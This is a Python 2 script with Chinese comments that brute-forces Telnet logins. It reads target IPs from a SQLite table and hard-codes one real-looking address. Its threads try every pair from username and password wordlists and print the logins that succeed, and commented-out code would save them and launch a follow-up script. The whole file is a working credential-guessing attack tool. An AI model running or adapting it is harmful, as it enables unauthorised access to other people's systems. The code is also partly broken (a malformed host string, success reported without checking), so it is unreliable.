#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#对Telnet实现暴力破解
import Csqlite3 #数据库操作文件
import telnetlib
import threading
import thread
import time
from collections import defaultdict, deque
from threading import Thread

class CS_Telnet(threading.Thread):
    def __init__(self,htint):
        threading.Thread.__init__(self)
        self.Ht=htint  #线程ID
        self.sql3=Csqlite3.C_sqlite3()
        self.sql3.mysqlite3_open()

    #######
    WEAK_USERNAME = [p.replace('\n','') for p in open('username.dic').readlines()]
    WEAK_PASSWORD = [p.replace('\n','') for p in open('password.dic').readlines()]


    def run(self):
        try:
            print u"<<<FTP爆破CS_Telnet线程%d启动"%(self.Ht)
            #self.open_sqlite()     #读取IP
            self.Telnet_login("117.95.103.50,23") #Telnet登陆
        except:
            print u"<<<线程Telnet%d--CS_Telnet---run异常！！！！！"%(self.Ht)
            time.sleep(60)
            self.run()

    ####################################################################
    def open_sqlite(self):     #读取IP
        try:
            self.bengip=""
            self.Asql="select * from port23 limit 1"
            self.sql3.conn.commit()# 获取到游标对象
            cur = self.sql3.conn.cursor()# 用游标来查询就可以获取到结果
            cur.execute(self.Asql)# 获取所有结果
            res = cur.fetchall()  #从结果中取出所有记录
            for line in res:
                #print line[0],"-----",line[1]
                self.bengip=line[0]
            cur.close()  #关闭游标

            self.update = "delete from port23 where ip='%s'"%(self.bengip)
            self.sql3.mysqlite3_delete(self.update)
            #print u"测试：",self.bengip,"-----",self.endip  #254.250.1.1 ----- 254.250.255.255
            print u"<<<Telnet线程%d--测试：%s"%(self.Ht,self.bengip)
            if self.bengip == '':  #传入值等于空   返回
                time.sleep(300)
                self.open_sqlite()     #读取URL

            self.Telnet_login(self.bengip) #Telnet登陆
            time.sleep(2)
            self.open_sqlite()     #读取URL
        except:
            print u"<<<Telnet线程%d--S_ip--open_sqlite表读取URL异常！！！！！"%(self.Ht)
            time.sleep(300)
            self.open_sqlite()     #读取URL
    ####################################################################

    def Telnet_login(self,host): #Telnet登陆
        self.t=time.time()  #扫描计时
        try:
            if host == '':  #传入值等于空   返回
                print u"地址不能为空"
                #self.open_sqlite()     #读取URL
                return
            telnetlib.Telnet(host)
            #self.telnet=telnetlib.Telnet(host)
        except Exception:
            print u"<<<Telnet线程%d--%s服务器Telnet端口可能没有开放"%(self.Ht,host)
            time.sleep(50)
            self.open_sqlite()     #读取URL
            return

        accounts = deque()   #list数组
        #准备 用户名和密码
        for username in CS_Telnet.WEAK_USERNAME:   #导入用户名#WEAK_USERNAME=username.dic
            for password in CS_Telnet.WEAK_PASSWORD:   #导入密码#WEAK_PASSWORD=password.dic
                if (username,password) not in accounts:#list数组
                    accounts.append((username,password))#添加到 list数组
                    ##################################################################
        if not accounts:   #数组无数据了就跳出
            print u"<<<Telnet线程%d--%s 数组无数据"%(self.Ht,host)
            #在从新读取
            time.sleep(60)
            #self.open_mysql()     #读取URL
            return 0
        print u"<<<Telnet线程%d--扫描网站FTP:%s 开始--组合出%d次密码"% (self.Ht,host,len(accounts))
        class crackThread(Thread):
            #破解 帐户线程
            def __init__(self,Ht):
                Thread.__init__(self)
                self.AHt=Ht
                self.running = True  #这是  控制线程数量

            def run(self):
                MAX_RETRIES = 5
                retry = 0
                account = None   #None=NULL  数组
                while self.running and accounts:#list数组
                    try:
                        if host == '':  #传入值等于空   返回
                            print u"地址不能为空"
                           #LINKFTP.sql_sel() #SQL查询
                            return
                        self.telnet=telnetlib.Telnet(host)
                        #self.telnet.set_debuglevel(1)
                        #tnsocket=self.telnet.get_socket()
                    except Exception:
                        if retry <= MAX_RETRIES:  #这是为了控制线程吗
                            retry = retry +1    #没必要使用这个变量啊
                            continue  #跳过
                        else:
                            self.running = False  #这是  控制线程
                            break   #跳出

                    #重新每三次    为什么一个账户要连接3次  呢
                    loop_num = 0
                    while loop_num<3:
                        loop_num = loop_num + 1
                        if not account and accounts:#list数组
                            account = accounts.pop()   #list数组  输出
                        #绝对不要尝试
                        if not account:   #数组无数据了就跳出
                            break   #跳出

                        #print ".",
                        #print u'IP:',host,u'用户名:',account[0],u'密码:',account[1]
                        try:
                            self.telnet.read_until("login:")
                            self.telnet.write(account[0]+ "\r\n")
                            self.telnet.read_until("password:")
                            self.telnet.write(account[1]+ "\r\n")
                            #self.telnet.write("dir"+'\r\n')   #查看目录WIN  LINUX  通用
                            self.telnet.close()  #终止Telnet连接
                            del self.telnet
#                            #没有异常发生，这是一个正确的帐号
                            print u"<<<Telnet线程",self.AHt,u'--telnet连接成功IP:',host,u"用户名:",account[0],u"密码:",account[1]
#                            self.Asql3=Csqlite3.C_sqlite3()
#                            self.Asql3.mysqlite3_open()
#                            print u"<<<线程",self.AHt,u'--FTP连接成功IP:',host,u"用户名:",account[0],u"密码:",account[1]
#                            ABCsql = "insert into ftppassword0(IP,user,password,time) values('%s','%s','%s','%s')"%(host,account[0],account[1],time.strftime('%Y.%m.%d-%H.%M.%S'))
#                            self.Asql3.mysqlite3_insert(ABCsql) #添加到数据库
#                            time.sleep(3)
#                            #os.system('python adminFTP.py %s %s %s'%(host,account[0],account[1]))
                            account = None  #None=NULL   self.sql.
                        except Exception, e:
                            account = None  #None=NULL
                            self.telnet.close()  #终止Telnet连接
                            del self.telnet
                            retry = retry +1

        nthreads=5  #创建10个线程
        threads = []  #线程
        for i in range(nthreads):  #nthreads=10  创建10个线程
            threads.append(crackThread(self.Ht))

        for thread in threads:   #不理解这是什么意思    是结束线程吗
            thread.start()  #start就是开始线程

        for thread in threads:   #不理解这是什么意思    是结束线程吗
            thread.join()
        print u"<<<Telnet线程%d--==%s扫描结束%s=====用时%s<<<"%(self.Ht,host,time.strftime('%Y.%m.%d-%H.%M.%S'),time.time()-self.t)
        self.open_sqlite()     #读取URL
################################################
if __name__=='__main__':
    threads = []  #线程
    nthreads=1
    for i in range(nthreads):  #nthreads=10  创建10个线程
        threads.append(CS_Telnet(i))

    for thread in threads:   #不理解这是什么意思    是结束线程吗
        thread.start()  #start就是开始线程

